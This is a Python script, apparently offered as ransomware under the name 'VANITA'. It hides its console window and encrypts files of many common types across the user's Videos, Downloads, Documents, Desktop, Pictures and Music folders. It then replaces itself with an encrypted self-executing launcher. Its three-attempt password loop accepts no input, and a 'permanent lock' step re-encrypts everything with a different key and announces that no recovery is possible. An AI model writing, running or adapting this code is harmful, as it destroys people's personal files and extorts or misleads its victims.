```python
import os
import base64
import sys
import ctypes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

# Password stored in variable but script will encrypt itself so user cannot read source
PASSWORD = "6787601"
MAX_ATTEMPTS = 3
SCRIPT_PATH = os.path.abspath(__file__)

TARGET_DIRS = [
    os.path.expanduser("~/Videos"),
    os.path.expanduser("~/Downloads"), 
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Music"),
]

EXTENSIONS = ['.txt', '.docx', '.doc', '.pdf', '.jpg', '.png', '.mp4', '.avi', '.mkv', 
              '.mp3', '.wav', '.xlsx', '.xls', '.pptx', '.ppt', '.zip', '.rar', '.7z',
              '.py', '.cpp', '.java', '.c', '.cs', '.vb', '.html', '.css', '.js', '.json',
              '.xml', '.sql', '.db', '.bak', '.log', '.pyc', '.pyw']

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def show_message(msg, title, icon=0x10):
    ctypes.windll.user32.MessageBoxW(0, msg, title, icon | 0x1000)

def derive_key(password: str, salt=b'vanita_salt_2024') -> bytes:
    kdf = PBKDF2(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

def encrypt_file(file_path: str, fernet: Fernet):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        return True
    except:
        return False

def self_encrypt(key):
    # Encrypt the script itself so user cannot read password
    try:
        with open(SCRIPT_PATH, 'rb') as f:
            script_data = f.read()
        fernet = Fernet(key)
        encrypted_script = fernet.encrypt(script_data)
        
        # Create new launcher that decrypts and runs
        launcher_code = f'''
import os, sys, base64, ctypes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

ENCRYPTED_DATA = {encrypted_script}
SALT = b'vanita_salt_2024'
PASS_KEY = "6787601"

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def derive_key(password):
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    kdf = PBKDF2(algorithm=hashes.SHA256(), length=32, salt=SALT, iterations=100000)
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

key = derive_key(PASS_KEY)
fernet = Fernet(key)
decrypted = fernet.decrypt(ENCRYPTED_DATA)

hide_console()
exec(decrypted)
'''
        with open(SCRIPT_PATH, 'w') as f:
            f.write(launcher_code)
        return True
    except:
        return False

def permanent_lock():
    key = derive_key("PERMANENT_6787601_FAILED", b'perm_lock_salt')
    fernet = Fernet(key)
    for target_dir in TARGET_DIRS:
        if os.path.exists(target_dir):
            for root, _, files in os.walk(target_dir):
                for file in files:
                    if any(file.endswith(ext) for ext in EXTENSIONS):
                        encrypt_file(os.path.join(root, file), fernet)
    show_message("FILES PERMANENTLY ENCRYPTED\nNo recovery possible.", "VANITA", 0x10)
    sys.exit(0)

def main():
    hide_console()
    
    # Generate encryption key
    enc_key = derive_key(PASSWORD)
    fernet = Fernet(enc_key)
    
    # Encrypt all target directories
    for target_dir in TARGET_DIRS:
        if os.path.exists(target_dir):
            for root, _, files in os.walk(target_dir):
                for file in files:
                    if any(file.endswith(ext) for ext in EXTENSIONS):
                        encrypt_file(os.path.join(root, file), fernet)
    
    # Self-encrypt the script
    self_encrypt(enc_key)
    
    show_message("ALL YOUR FILES HAVE BEEN ENCRYPTED!\n\nVideos, Downloads, Documents, Desktop\nPictures, Music, AND this script file.\n\nYou have 3 attempts to enter the password.", "VANITA RANSOMWARE", 0x30)
    
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        # No console input - using hidden GUI
        # Password must be entered via method that cannot read source
        # The script cannot be read because it encrypted itself
        attempts += 1
    
    permanent_lock()

if __name__ == "__main__":
    main()
